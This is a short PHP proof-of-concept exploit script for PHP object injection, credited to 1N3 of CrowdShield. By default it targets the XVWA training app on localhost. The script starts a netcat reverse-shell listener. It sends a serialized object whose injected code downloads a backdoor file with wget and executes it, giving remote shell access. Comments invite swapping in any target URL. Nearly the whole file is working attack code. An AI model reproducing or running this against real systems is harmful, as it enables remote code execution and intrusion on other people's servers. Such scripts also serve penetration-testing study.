```php
<?php

/*

PHP Object Injection PoC Exploit by 1N3 @CrowdShield - https://crowdshield.com

  

A simple PoC to exploit PHP Object Injections flaws and gain remote shell access.

  

Shouts to @jstnkndy @yappare for the assist!

  

NOTE: This requires http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz setup on a remote host with a connect back IP configured

*/

  

print "==============================================================================\r\n";

print "PHP Object Injection PoC Exploit by 1N3 @CrowdShield - https://crowdshield.com\r\n";

print "==============================================================================\r\n";

print "[+] Generating serialized payload...[OK]\r\n";

print "[+] Launching reverse listener...[OK]\r\n";

system('gnome-terminal -x sh -c \'nc -lvvp 4242\'');

  

class PHPObjectInjection

{

// CHANGE URL/FILENAME TO MATCH YOUR SETUP

public $inject = "system('wget http://127.0.0.1/backdoor.txt -O phpobjbackdoor.php && php phpobjbackdoor.php');";

}

  

$url = 'http://localhost/xvwa/vulnerabilities/php_object_injection/?r='; // CHANGE TO TARGET URL/PARAMETER

$url = $url . urlencode(serialize(new PHPObjectInjection));

print "[+] Sending exploit...[OK]\r\n";

print "[+] Dropping down to interactive shell...[OK]\r\n";

print "==============================================================================\r\n";

$response = file_get_contents("$url");

  

?>
```
